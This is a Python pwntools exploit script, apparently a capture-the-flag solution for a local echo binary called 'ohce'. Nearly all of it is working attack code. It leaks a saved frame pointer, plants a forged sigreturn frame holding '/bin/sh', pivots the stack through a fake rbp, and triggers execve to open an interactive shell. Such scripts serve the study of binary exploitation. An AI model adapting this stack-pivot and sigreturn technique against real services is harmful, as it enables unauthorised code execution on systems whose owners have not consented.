from pwn import *
from struct import pack

r = remote("127.0.0.1", 8787)
# r = process("./ohce")


### 1 leak
r.sendline("1")
r.clean()
payload = "leak"*7+"aaa"
r.sendline(payload)
sfp = r.recvn(38)
sfp = sfp[32:38]
sfp = sfp.ljust(8, "\x00")
sfp = u64(sfp)
print "# 1 leaked sfp : " + hex(sfp)
r.recvuntil(" > \x00")

### 2 insert payload
fake_sfp2 = sfp-0x180
fake_sfp1 = sfp-0x170    # point to payload_top
echo_addr = 0x40014c
syscall_addr = 0x4001a0

rdi = fake_sfp1 + 0x18
rsi = 0
rbp = fake_sfp2
rbx = 0
rdx = 0
rax = 0x3b
rcx = 0
rsp = fake_sfp2
rip = syscall_addr
eflags = 0x202
cs = 0x33
ss = 0x2b

r.sendline("1")
payload = p64(fake_sfp2)
payload += p64(echo_addr)
payload += p64(syscall_addr)
payload += "/bin/sh\x00"
payload += "\x00" * 0x20 # rsp~rsp+0x28 dummy
payload += p64(0x0) * 8 # r8~r15
payload += p64(rdi)
payload += p64(rsi)
payload += p64(rbp)
payload += p64(rbx)
payload += p64(rdx)
payload += p64(rax)
payload += p64(rcx)
payload += p64(rsp)
payload += p64(rip)
payload += p64(eflags)
payload += p16(cs)
payload += p16(0)
payload += p16(0)
payload += p16(ss)
payload += p64(0x0) * 5 # err ~ union
payload += p64(0x0) * 8 # reserved[8]
###### total 0x140 bytes ######
payload += p64(0x0) # to raise buf upwards.
r.sendline(payload)
print "# 2 insert payload"
r.recvuntil(" > \x00")


### 3 VULN : echo(Reverse), fake rbp
r.sendline("2")
r.clean()
payload = p64(fake_sfp1, endian="big")[2:]
payload += "b"*25
r.sendline(payload)
print "# 3 VULN : echo(Reverse), fake rbp"
print(r.recv())

### 4 ret echo : set rax : 0xf
r.sendline("b"*14)
print "# 4 ret echo : set rax : 0xf"
print(r.recv())

r.interactive()